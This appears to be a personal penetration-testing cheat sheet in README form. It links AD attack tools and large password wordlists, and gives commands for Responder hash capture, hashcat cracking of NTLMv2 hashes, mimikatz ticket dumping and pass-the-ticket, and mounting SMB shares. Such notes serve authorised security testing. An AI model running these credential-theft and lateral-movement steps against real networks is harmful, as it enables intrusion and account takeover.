# Gunnajs-Playbook
How to pentest like a Gunnaj

## Tools bby

### linWinPwn - Active Directory Vulnerability Scanner
https://github.com/lefayjey/linWinPwn
### mimikatz
https://github.com/ParrotSec/mimikatz
### Responder
https://github.com/lgandx/Responder

## Wordlists bby
https://crackstation.net/files/crackstation.txt.gz (4.2 GB)
https://download.g0tmi1k.com/wordlists/large/36.4GB-18_in_1.lst.7z (48.4 GB)
https://download.g0tmi1k.com/wordlists/large/b0n3z-wordlist-sorted-something.tar.gz (165 GB)

# VEV

## linWinPwn 
```bash
sudo ./linWinPwn.sh -t <Domain_Controller_IP> -u <AD_user> -p <AD_password>
```
## SMB VEV
### Mount share
```bash
sudo mount.cifs <//ip/folder> <./mapp> -o user=<username>,password=<password>,dom=<domain.com>
```
### Unmount share
```bash
sudo umount.cifs <./mapp>
```
### Search for keywords in files
```bash
grep -i <keyword> *
```
## Nmap
* in the making 

## Zero Logon
* in the making 
## Responder
### Kickstart responder
```bash
responder -I eth0 -v
```
### Crack NTLMv2 hashes
```bash
hashcat64.exe -m 5600 ntlm-hashes.txt <passlist.txt> -o cracked.txt
```

## Mimikatz
### Dump tickets
```bash
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```
### Pass the ticket
```bash
mimikatz.exe
kerberos::ptt <ticket>
klist
```
